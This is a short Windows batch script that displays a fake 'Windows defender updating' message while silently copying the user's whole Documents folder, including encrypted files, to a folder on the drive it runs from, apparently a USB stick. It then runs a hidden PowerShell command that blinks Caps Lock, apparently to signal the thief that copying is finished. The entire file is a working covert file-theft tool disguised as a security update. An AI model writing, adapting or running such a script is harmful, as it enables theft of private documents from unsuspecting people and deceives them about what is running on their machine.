@echo off
@echo Windows defender updating

set dst=%~d0\NSUCSE_navid\

mkdir %dst% 

if Exist %USERPROFILE%\Documents (
REM /C copy ignoring errors
REM /Q dont show filename while copying
REM /G permit to copy usupported encrypted files
REM /Y allows overwriting existing file
REM /E copy everything including empty directory

xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\ %dst% 


)


start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit
